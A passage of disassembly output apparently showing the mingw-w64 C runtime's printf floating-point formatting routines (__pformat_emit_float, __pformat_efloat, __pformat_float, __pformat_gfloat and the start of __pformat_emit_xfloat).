   140004cce:	5f                   	pop    %rdi
   140004ccf:	5d                   	pop    %rbp
   140004cd0:	c3                   	ret
   140004cd1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004cd8:	85 c0                	test   %eax,%eax
   140004cda:	0f 8e 40 01 00 00    	jle    140004e20 <__pformat_emit_float+0x340>
   140004ce0:	41 8b 51 10          	mov    0x10(%r9),%edx
   140004ce4:	83 e8 01             	sub    $0x1,%eax
   140004ce7:	39 d0                	cmp    %edx,%eax
   140004ce9:	0f 8e 3f 01 00 00    	jle    140004e2e <__pformat_emit_float+0x34e>
   140004cef:	29 d0                	sub    %edx,%eax
   140004cf1:	85 d2                	test   %edx,%edx
   140004cf3:	0f 8e 87 01 00 00    	jle    140004e80 <__pformat_emit_float+0x3a0>
   140004cf9:	83 e8 01             	sub    $0x1,%eax
   140004cfc:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004d00:	85 c0                	test   %eax,%eax
   140004d02:	0f 8e 78 fe ff ff    	jle    140004b80 <__pformat_emit_float+0xa0>
   140004d08:	85 ed                	test   %ebp,%ebp
   140004d0a:	0f 85 30 01 00 00    	jne    140004e40 <__pformat_emit_float+0x360>
   140004d10:	8b 53 08             	mov    0x8(%rbx),%edx
   140004d13:	f7 c2 c0 01 00 00    	test   $0x1c0,%edx
   140004d19:	0f 85 41 01 00 00    	jne    140004e60 <__pformat_emit_float+0x380>
   140004d1f:	80 e6 06             	and    $0x6,%dh
   140004d22:	0f 85 88 fe ff ff    	jne    140004bb0 <__pformat_emit_float+0xd0>
   140004d28:	83 e8 01             	sub    $0x1,%eax
   140004d2b:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004d2e:	66 90                	xchg   %ax,%ax
   140004d30:	48 89 da             	mov    %rbx,%rdx
   140004d33:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004d38:	e8 73 ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d3d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004d40:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004d43:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004d46:	85 c0                	test   %eax,%eax
   140004d48:	7f e6                	jg     140004d30 <__pformat_emit_float+0x250>
   140004d4a:	85 ed                	test   %ebp,%ebp
   140004d4c:	0f 84 36 fe ff ff    	je     140004b88 <__pformat_emit_float+0xa8>
   140004d52:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d58:	48 89 da             	mov    %rbx,%rdx
   140004d5b:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140004d60:	e8 4b ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d65:	e9 46 fe ff ff       	jmp    140004bb0 <__pformat_emit_float+0xd0>
   140004d6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d70:	48 89 da             	mov    %rbx,%rdx
   140004d73:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004d78:	e8 33 ee ff ff       	call   140003bb0 <__pformat_putc>
   140004d7d:	8b 43 10             	mov    0x10(%rbx),%eax
   140004d80:	85 c0                	test   %eax,%eax
   140004d82:	0f 8f 40 01 00 00    	jg     140004ec8 <__pformat_emit_float+0x3e8>
   140004d88:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   140004d8c:	0f 85 36 01 00 00    	jne    140004ec8 <__pformat_emit_float+0x3e8>
   140004d92:	85 f6                	test   %esi,%esi
   140004d94:	0f 84 e3 fe ff ff    	je     140004c7d <__pformat_emit_float+0x19d>
   140004d9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004da0:	01 f0                	add    %esi,%eax
   140004da2:	89 43 10             	mov    %eax,0x10(%rbx)
   140004da5:	0f 1f 00             	nopl   (%rax)
   140004da8:	48 89 da             	mov    %rbx,%rdx
   140004dab:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004db0:	e8 fb ed ff ff       	call   140003bb0 <__pformat_putc>
   140004db5:	83 c6 01             	add    $0x1,%esi
   140004db8:	75 ee                	jne    140004da8 <__pformat_emit_float+0x2c8>
   140004dba:	e9 fc fe ff ff       	jmp    140004cbb <__pformat_emit_float+0x1db>
   140004dbf:	90                   	nop
   140004dc0:	48 89 da             	mov    %rbx,%rdx
   140004dc3:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140004dc8:	e8 e3 ed ff ff       	call   140003bb0 <__pformat_putc>
   140004dcd:	e9 de fd ff ff       	jmp    140004bb0 <__pformat_emit_float+0xd0>
   140004dd2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004dd8:	83 e8 01             	sub    $0x1,%eax
   140004ddb:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004dde:	66 90                	xchg   %ax,%ax
   140004de0:	48 89 da             	mov    %rbx,%rdx
   140004de3:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004de8:	e8 c3 ed ff ff       	call   140003bb0 <__pformat_putc>
   140004ded:	8b 43 0c             	mov    0xc(%rbx),%eax
   140004df0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004df3:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004df6:	85 c0                	test   %eax,%eax
   140004df8:	7f e6                	jg     140004de0 <__pformat_emit_float+0x300>
   140004dfa:	e9 cd fd ff ff       	jmp    140004bcc <__pformat_emit_float+0xec>
   140004dff:	90                   	nop
   140004e00:	29 d0                	sub    %edx,%eax
   140004e02:	85 d2                	test   %edx,%edx
   140004e04:	7e 7a                	jle    140004e80 <__pformat_emit_float+0x3a0>
   140004e06:	83 e8 01             	sub    $0x1,%eax
   140004e09:	41 8b 51 08          	mov    0x8(%r9),%edx
   140004e0d:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004e11:	e9 13 fd ff ff       	jmp    140004b29 <__pformat_emit_float+0x49>
   140004e16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004e1d:	00 00 00 
   140004e20:	75 0c                	jne    140004e2e <__pformat_emit_float+0x34e>
   140004e22:	41 8b 51 10          	mov    0x10(%r9),%edx
   140004e26:	85 d2                	test   %edx,%edx
   140004e28:	0f 88 b2 00 00 00    	js     140004ee0 <__pformat_emit_float+0x400>
   140004e2e:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140004e35:	e9 46 fd ff ff       	jmp    140004b80 <__pformat_emit_float+0xa0>
   140004e3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004e40:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004e43:	89 53 0c             	mov    %edx,0xc(%rbx)
   140004e46:	85 d2                	test   %edx,%edx
   140004e48:	0f 84 0a ff ff ff    	je     140004d58 <__pformat_emit_float+0x278>
   140004e4e:	f6 43 09 06          	testb  $0x6,0x9(%rbx)
   140004e52:	0f 85 00 ff ff ff    	jne    140004d58 <__pformat_emit_float+0x278>
   140004e58:	83 e8 02             	sub    $0x2,%eax
   140004e5b:	e9 cb fe ff ff       	jmp    140004d2b <__pformat_emit_float+0x24b>
   140004e60:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004e63:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   140004e66:	85 c9                	test   %ecx,%ecx
   140004e68:	0f 84 1d fd ff ff    	je     140004b8b <__pformat_emit_float+0xab>
   140004e6e:	f6 c6 06             	test   $0x6,%dh
   140004e71:	0f 85 14 fd ff ff    	jne    140004b8b <__pformat_emit_float+0xab>
   140004e77:	eb df                	jmp    140004e58 <__pformat_emit_float+0x378>
   140004e79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004e80:	8b 53 08             	mov    0x8(%rbx),%edx
   140004e83:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004e86:	f6 c6 08             	test   $0x8,%dh
   140004e89:	75 25                	jne    140004eb0 <__pformat_emit_float+0x3d0>
   140004e8b:	85 f6                	test   %esi,%esi
   140004e8d:	0f 8e 75 fe ff ff    	jle    140004d08 <__pformat_emit_float+0x228>
   140004e93:	80 e6 10             	and    $0x10,%dh
   140004e96:	0f 84 6c fe ff ff    	je     140004d08 <__pformat_emit_float+0x228>
   140004e9c:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140004ea1:	0f 85 96 fc ff ff    	jne    140004b3d <__pformat_emit_float+0x5d>
   140004ea7:	e9 5c fe ff ff       	jmp    140004d08 <__pformat_emit_float+0x228>
   140004eac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004eb0:	83 e8 01             	sub    $0x1,%eax
   140004eb3:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004eb6:	85 f6                	test   %esi,%esi
   140004eb8:	0f 8f 6b fc ff ff    	jg     140004b29 <__pformat_emit_float+0x49>
   140004ebe:	e9 3d fe ff ff       	jmp    140004d00 <__pformat_emit_float+0x220>
   140004ec3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ec8:	48 89 d9             	mov    %rbx,%rcx
   140004ecb:	e8 c0 fa ff ff       	call   140004990 <__pformat_emit_radix_point>
   140004ed0:	85 f6                	test   %esi,%esi
   140004ed2:	0f 84 e3 fd ff ff    	je     140004cbb <__pformat_emit_float+0x1db>
   140004ed8:	8b 43 10             	mov    0x10(%rbx),%eax
   140004edb:	e9 c0 fe ff ff       	jmp    140004da0 <__pformat_emit_float+0x2c0>
   140004ee0:	89 d0                	mov    %edx,%eax
   140004ee2:	f7 d8                	neg    %eax
   140004ee4:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004ee8:	41 f6 41 09 08       	testb  $0x8,0x9(%r9)
   140004eed:	0f 84 15 fe ff ff    	je     140004d08 <__pformat_emit_float+0x228>
   140004ef3:	89 d0                	mov    %edx,%eax
   140004ef5:	f7 d0                	not    %eax
   140004ef7:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004efb:	e9 00 fe ff ff       	jmp    140004d00 <__pformat_emit_float+0x220>

0000000140004f00 <__pformat_emit_efloat>:
   140004f00:	57                   	push   %rdi
   140004f01:	56                   	push   %rsi
   140004f02:	53                   	push   %rbx
   140004f03:	48 83 ec 20          	sub    $0x20,%rsp
   140004f07:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   140004f0d:	41 83 e8 01          	sub    $0x1,%r8d
   140004f11:	41 89 cb             	mov    %ecx,%r11d
   140004f14:	4c 89 cb             	mov    %r9,%rbx
   140004f17:	49 63 f0             	movslq %r8d,%rsi
   140004f1a:	41 c1 f8 1f          	sar    $0x1f,%r8d
   140004f1e:	48 69 ce 67 66 66 66 	imul   $0x66666667,%rsi,%rcx
   140004f25:	48 c1 f9 22          	sar    $0x22,%rcx
   140004f29:	44 29 c1             	sub    %r8d,%ecx
   140004f2c:	74 1d                	je     140004f4b <__pformat_emit_efloat+0x4b>
   140004f2e:	66 90                	xchg   %ax,%ax
   140004f30:	48 63 c1             	movslq %ecx,%rax
   140004f33:	c1 f9 1f             	sar    $0x1f,%ecx
   140004f36:	41 83 c2 01          	add    $0x1,%r10d
   140004f3a:	48 69 c0 67 66 66 66 	imul   $0x66666667,%rax,%rax
   140004f41:	48 c1 f8 22          	sar    $0x22,%rax
   140004f45:	29 c8                	sub    %ecx,%eax
   140004f47:	89 c1                	mov    %eax,%ecx
   140004f49:	75 e5                	jne    140004f30 <__pformat_emit_efloat+0x30>
   140004f4b:	8b 43 2c             	mov    0x2c(%rbx),%eax
   140004f4e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004f51:	75 0c                	jne    140004f5f <__pformat_emit_efloat+0x5f>
   140004f53:	c7 43 2c 02 00 00 00 	movl   $0x2,0x2c(%rbx)
   140004f5a:	b8 02 00 00 00       	mov    $0x2,%eax
   140004f5f:	44 39 d0             	cmp    %r10d,%eax
   140004f62:	44 89 d7             	mov    %r10d,%edi
   140004f65:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   140004f69:	49 89 d9             	mov    %rbx,%r9
   140004f6c:	0f 4d f8             	cmovge %eax,%edi
   140004f6f:	44 89 c0             	mov    %r8d,%eax
   140004f72:	8d 4f 02             	lea    0x2(%rdi),%ecx
   140004f75:	29 c8                	sub    %ecx,%eax
   140004f77:	41 39 c8             	cmp    %ecx,%r8d
   140004f7a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004f7f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004f85:	0f 4e c1             	cmovle %ecx,%eax
   140004f88:	44 89 d9             	mov    %r11d,%ecx
   140004f8b:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004f8e:	e8 4d fb ff ff       	call   140004ae0 <__pformat_emit_float>
   140004f93:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140004f96:	8b 43 2c             	mov    0x2c(%rbx),%eax
   140004f99:	48 89 da             	mov    %rbx,%rdx
   140004f9c:	89 43 10             	mov    %eax,0x10(%rbx)
   140004f9f:	89 c8                	mov    %ecx,%eax
   140004fa1:	83 e1 20             	and    $0x20,%ecx
   140004fa4:	0d c0 01 00 00       	or     $0x1c0,%eax
   140004fa9:	83 c9 45             	or     $0x45,%ecx
   140004fac:	89 43 08             	mov    %eax,0x8(%rbx)
   140004faf:	e8 fc eb ff ff       	call   140003bb0 <__pformat_putc>
   140004fb4:	8d 47 01             	lea    0x1(%rdi),%eax
   140004fb7:	01 43 0c             	add    %eax,0xc(%rbx)
   140004fba:	48 89 da             	mov    %rbx,%rdx
   140004fbd:	48 89 f1             	mov    %rsi,%rcx
   140004fc0:	48 83 c4 20          	add    $0x20,%rsp
   140004fc4:	5b                   	pop    %rbx
   140004fc5:	5e                   	pop    %rsi
   140004fc6:	5f                   	pop    %rdi
   140004fc7:	e9 14 f6 ff ff       	jmp    1400045e0 <__pformat_int.isra.0>
   140004fcc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140004fd0 <__pformat_efloat>:
   140004fd0:	56                   	push   %rsi
   140004fd1:	53                   	push   %rbx
   140004fd2:	48 83 ec 58          	sub    $0x58,%rsp
   140004fd6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   140004fda:	db 29                	fldt   (%rcx)
   140004fdc:	48 89 d3             	mov    %rdx,%rbx
   140004fdf:	45 85 c0             	test   %r8d,%r8d
   140004fe2:	78 5c                	js     140005040 <__pformat_efloat+0x70>
   140004fe4:	41 83 c0 01          	add    $0x1,%r8d
   140004fe8:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140004fed:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004ff2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004ff7:	db 7c 24 30          	fstpt  0x30(%rsp)
   140004ffb:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140005000:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005005:	e8 b6 ea ff ff       	call   140003ac0 <__pformat_cvt>
   14000500a:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   14000500f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140005013:	48 89 c6             	mov    %rax,%rsi
   140005016:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   14000501d:	74 31                	je     140005050 <__pformat_efloat+0x80>
   14000501f:	49 89 d9             	mov    %rbx,%r9
   140005022:	48 89 c2             	mov    %rax,%rdx
   140005025:	e8 d6 fe ff ff       	call   140004f00 <__pformat_emit_efloat>
   14000502a:	48 89 f1             	mov    %rsi,%rcx
   14000502d:	e8 6e 13 00 00       	call   1400063a0 <__freedtoa>
   140005032:	90                   	nop
   140005033:	48 83 c4 58          	add    $0x58,%rsp
   140005037:	5b                   	pop    %rbx
   140005038:	5e                   	pop    %rsi
   140005039:	c3                   	ret
   14000503a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005040:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   140005047:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000504d:	eb 99                	jmp    140004fe8 <__pformat_efloat+0x18>
   14000504f:	90                   	nop
   140005050:	49 89 d8             	mov    %rbx,%r8
   140005053:	48 89 c2             	mov    %rax,%rdx
   140005056:	e8 e5 ee ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   14000505b:	48 89 f1             	mov    %rsi,%rcx
   14000505e:	e8 3d 13 00 00       	call   1400063a0 <__freedtoa>
   140005063:	90                   	nop
   140005064:	48 83 c4 58          	add    $0x58,%rsp
   140005068:	5b                   	pop    %rbx
   140005069:	5e                   	pop    %rsi
   14000506a:	c3                   	ret
   14000506b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140005070 <__pformat_float>:
   140005070:	56                   	push   %rsi
   140005071:	53                   	push   %rbx
   140005072:	48 83 ec 58          	sub    $0x58,%rsp
   140005076:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   14000507a:	db 29                	fldt   (%rcx)
   14000507c:	48 89 d3             	mov    %rdx,%rbx
   14000507f:	45 85 c0             	test   %r8d,%r8d
   140005082:	79 0d                	jns    140005091 <__pformat_float+0x21>
   140005084:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   14000508b:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140005091:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005096:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000509b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400050a0:	db 7c 24 30          	fstpt  0x30(%rsp)
   1400050a4:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   1400050a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400050ae:	e8 0d ea ff ff       	call   140003ac0 <__pformat_cvt>
   1400050b3:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   1400050b8:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   1400050bc:	48 89 c6             	mov    %rax,%rsi
   1400050bf:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   1400050c6:	74 68                	je     140005130 <__pformat_float+0xc0>
   1400050c8:	48 89 c2             	mov    %rax,%rdx
   1400050cb:	49 89 d9             	mov    %rbx,%r9
   1400050ce:	e8 0d fa ff ff       	call   140004ae0 <__pformat_emit_float>
   1400050d3:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400050d6:	eb 1c                	jmp    1400050f4 <__pformat_float+0x84>
   1400050d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400050df:	00 
   1400050e0:	48 63 43 24          	movslq 0x24(%rbx),%rax
   1400050e4:	c6 04 02 20          	movb   $0x20,(%rdx,%rax,1)
   1400050e8:	8b 53 24             	mov    0x24(%rbx),%edx
   1400050eb:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400050ee:	83 c2 01             	add    $0x1,%edx
   1400050f1:	89 53 24             	mov    %edx,0x24(%rbx)
   1400050f4:	89 c2                	mov    %eax,%edx
   1400050f6:	83 e8 01             	sub    $0x1,%eax
   1400050f9:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400050fc:	85 d2                	test   %edx,%edx
   1400050fe:	7e 3b                	jle    14000513b <__pformat_float+0xcb>
   140005100:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140005103:	f6 c5 40             	test   $0x40,%ch
   140005106:	75 08                	jne    140005110 <__pformat_float+0xa0>
   140005108:	8b 53 24             	mov    0x24(%rbx),%edx
   14000510b:	39 53 28             	cmp    %edx,0x28(%rbx)
   14000510e:	7e de                	jle    1400050ee <__pformat_float+0x7e>
   140005110:	48 8b 13             	mov    (%rbx),%rdx
   140005113:	80 e5 20             	and    $0x20,%ch
   140005116:	74 c8                	je     1400050e0 <__pformat_float+0x70>
   140005118:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000511d:	e8 8e 42 00 00       	call   1400093b0 <fputc>
   140005122:	8b 53 24             	mov    0x24(%rbx),%edx
   140005125:	8b 43 0c             	mov    0xc(%rbx),%eax
   140005128:	eb c4                	jmp    1400050ee <__pformat_float+0x7e>
   14000512a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005130:	49 89 d8             	mov    %rbx,%r8
   140005133:	48 89 c2             	mov    %rax,%rdx
   140005136:	e8 05 ee ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   14000513b:	48 89 f1             	mov    %rsi,%rcx
   14000513e:	e8 5d 12 00 00       	call   1400063a0 <__freedtoa>
   140005143:	90                   	nop
   140005144:	48 83 c4 58          	add    $0x58,%rsp
   140005148:	5b                   	pop    %rbx
   140005149:	5e                   	pop    %rsi
   14000514a:	c3                   	ret
   14000514b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140005150 <__pformat_gfloat>:
   140005150:	55                   	push   %rbp
   140005151:	57                   	push   %rdi
   140005152:	56                   	push   %rsi
   140005153:	53                   	push   %rbx
   140005154:	48 83 ec 58          	sub    $0x58,%rsp
   140005158:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   14000515c:	db 29                	fldt   (%rcx)
   14000515e:	48 89 d3             	mov    %rdx,%rbx
   140005161:	45 85 c0             	test   %r8d,%r8d
   140005164:	0f 88 ee 00 00 00    	js     140005258 <__pformat_gfloat+0x108>
   14000516a:	0f 84 d0 00 00 00    	je     140005240 <__pformat_gfloat+0xf0>
   140005170:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005175:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000517a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000517f:	db 7c 24 30          	fstpt  0x30(%rsp)
   140005183:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140005188:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000518d:	e8 2e e9 ff ff       	call   140003ac0 <__pformat_cvt>
   140005192:	8b 7c 24 4c          	mov    0x4c(%rsp),%edi
   140005196:	8b 6c 24 48          	mov    0x48(%rsp),%ebp
   14000519a:	48 89 c6             	mov    %rax,%rsi
   14000519d:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
   1400051a3:	0f 84 c7 00 00 00    	je     140005270 <__pformat_gfloat+0x120>
   1400051a9:	8b 43 08             	mov    0x8(%rbx),%eax
   1400051ac:	25 00 08 00 00       	and    $0x800,%eax
   1400051b1:	83 ff fd             	cmp    $0xfffffffd,%edi
   1400051b4:	7c 4a                	jl     140005200 <__pformat_gfloat+0xb0>
   1400051b6:	8b 53 10             	mov    0x10(%rbx),%edx
   1400051b9:	39 d7                	cmp    %edx,%edi
   1400051bb:	7f 43                	jg     140005200 <__pformat_gfloat+0xb0>
   1400051bd:	85 c0                	test   %eax,%eax
   1400051bf:	0f 84 bb 00 00 00    	je     140005280 <__pformat_gfloat+0x130>
   1400051c5:	29 fa                	sub    %edi,%edx
   1400051c7:	89 53 10             	mov    %edx,0x10(%rbx)
   1400051ca:	49 89 d9             	mov    %rbx,%r9
   1400051cd:	41 89 f8             	mov    %edi,%r8d
   1400051d0:	48 89 f2             	mov    %rsi,%rdx
   1400051d3:	89 e9                	mov    %ebp,%ecx
   1400051d5:	e8 06 f9 ff ff       	call   140004ae0 <__pformat_emit_float>
   1400051da:	eb 11                	jmp    1400051ed <__pformat_gfloat+0x9d>
   1400051dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400051e0:	48 89 da             	mov    %rbx,%rdx
   1400051e3:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400051e8:	e8 c3 e9 ff ff       	call   140003bb0 <__pformat_putc>
   1400051ed:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400051f0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400051f3:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400051f6:	85 c0                	test   %eax,%eax
   1400051f8:	7f e6                	jg     1400051e0 <__pformat_gfloat+0x90>
   1400051fa:	eb 26                	jmp    140005222 <__pformat_gfloat+0xd2>
   1400051fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140005200:	85 c0                	test   %eax,%eax
   140005202:	75 34                	jne    140005238 <__pformat_gfloat+0xe8>
   140005204:	48 89 f1             	mov    %rsi,%rcx
   140005207:	e8 f4 41 00 00       	call   140009400 <strlen>
   14000520c:	83 e8 01             	sub    $0x1,%eax
   14000520f:	89 43 10             	mov    %eax,0x10(%rbx)
   140005212:	49 89 d9             	mov    %rbx,%r9
   140005215:	41 89 f8             	mov    %edi,%r8d
   140005218:	48 89 f2             	mov    %rsi,%rdx
   14000521b:	89 e9                	mov    %ebp,%ecx
   14000521d:	e8 de fc ff ff       	call   140004f00 <__pformat_emit_efloat>
   140005222:	48 89 f1             	mov    %rsi,%rcx
   140005225:	e8 76 11 00 00       	call   1400063a0 <__freedtoa>
   14000522a:	90                   	nop
   14000522b:	48 83 c4 58          	add    $0x58,%rsp
   14000522f:	5b                   	pop    %rbx
   140005230:	5e                   	pop    %rsi
   140005231:	5f                   	pop    %rdi
   140005232:	5d                   	pop    %rbp
   140005233:	c3                   	ret
   140005234:	0f 1f 40 00          	nopl   0x0(%rax)
   140005238:	8b 43 10             	mov    0x10(%rbx),%eax
   14000523b:	83 e8 01             	sub    $0x1,%eax
   14000523e:	eb cf                	jmp    14000520f <__pformat_gfloat+0xbf>
   140005240:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
   140005247:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000524d:	e9 1e ff ff ff       	jmp    140005170 <__pformat_gfloat+0x20>
   140005252:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005258:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   14000525f:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140005265:	e9 06 ff ff ff       	jmp    140005170 <__pformat_gfloat+0x20>
   14000526a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005270:	49 89 d8             	mov    %rbx,%r8
   140005273:	48 89 c2             	mov    %rax,%rdx
   140005276:	89 e9                	mov    %ebp,%ecx
   140005278:	e8 c3 ec ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   14000527d:	eb a3                	jmp    140005222 <__pformat_gfloat+0xd2>
   14000527f:	90                   	nop
   140005280:	48 89 f1             	mov    %rsi,%rcx
   140005283:	e8 78 41 00 00       	call   140009400 <strlen>
   140005288:	29 f8                	sub    %edi,%eax
   14000528a:	89 43 10             	mov    %eax,0x10(%rbx)
   14000528d:	0f 89 37 ff ff ff    	jns    1400051ca <__pformat_gfloat+0x7a>
   140005293:	8b 53 0c             	mov    0xc(%rbx),%edx
   140005296:	85 d2                	test   %edx,%edx
   140005298:	0f 8e 2c ff ff ff    	jle    1400051ca <__pformat_gfloat+0x7a>
   14000529e:	01 d0                	add    %edx,%eax
   1400052a0:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400052a3:	e9 22 ff ff ff       	jmp    1400051ca <__pformat_gfloat+0x7a>
   1400052a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400052af:	00 

00000001400052b0 <__pformat_emit_xfloat.isra.0>:
   1400052b0:	41 55                	push   %r13
   1400052b2:	41 54                	push   %r12
   1400052b4:	55                   	push   %rbp
   1400052b5:	57                   	push   %rdi
   1400052b6:	56                   	push   %rsi
   1400052b7:	53                   	push   %rbx
   1400052b8:	48 83 ec 58          	sub    $0x58,%rsp
   1400052bc:	4c 89 c3             	mov    %r8,%rbx
   1400052bf:	49 89 c9             	mov    %rcx,%r9
   1400052c2:	45 8b 40 10          	mov    0x10(%r8),%r8d
   1400052c6:	48 85 c9             	test   %rcx,%rcx
   1400052c9:	75 09                	jne    1400052d4 <__pformat_emit_xfloat.isra.0+0x24>
   1400052cb:	66 85 d2             	test   %dx,%dx
   1400052ce:	0f 84 e4 00 00 00    	je     1400053b8 <__pformat_emit_xfloat.isra.0+0x108>
   1400052d4:	44 8d 52 fd          	lea    -0x3(%rdx),%r10d
   1400052d8:	41 83 f8 0e          	cmp    $0xe,%r8d
   1400052dc:	0f 86 8e 00 00 00    	jbe    140005370 <__pformat_emit_xfloat.isra.0+0xc0>
   1400052e2:	49 0f bf ea          	movswq %r10w,%rbp
   1400052e6:	b8 10 00 00 00       	mov    $0x10,%eax
   1400052eb:	4d 85 c9             	test   %r9,%r9
   1400052ee:	0f 84 f4 03 00 00    	je     1400056e8 <__pformat_emit_xfloat.isra.0+0x438>
   1400052f4:	44 8b 43 08          	mov    0x8(%rbx),%r8d
   1400052f8:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   1400052fd:	48 89 fe             	mov    %rdi,%rsi
   140005300:	45 89 c3             	mov    %r8d,%r11d
   140005303:	41 83 e3 20          	and    $0x20,%r11d
   140005307:	eb 2e                	jmp    140005337 <__pformat_emit_xfloat.isra.0+0x87>
   140005309:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005310:	48 39 f7             	cmp    %rsi,%rdi
   140005313:	72 09                	jb     14000531e <__pformat_emit_xfloat.isra.0+0x6e>
   140005315:	44 8b 63 10          	mov    0x10(%rbx),%r12d
   140005319:	45 85 e4             	test   %r12d,%r12d
   14000531c:	78 0c                	js     14000532a <__pformat_emit_xfloat.isra.0+0x7a>
   14000531e:	8d 51 30             	lea    0x30(%rcx),%edx
   140005321:	48 89 f1             	mov    %rsi,%rcx
   140005324:	88 11                	mov    %dl,(%rcx)
   140005326:	48 83 c6 01          	add    $0x1,%rsi
   14000532a:	49 c1 e9 04          	shr    $0x4,%r9
   14000532e:	83 e8 01             	sub    $0x1,%eax
   140005331:	0f 84 29 01 00 00    	je     140005460 <__pformat_emit_xfloat.isra.0+0x1b0>
   140005337:	44 89 c9             	mov    %r9d,%ecx
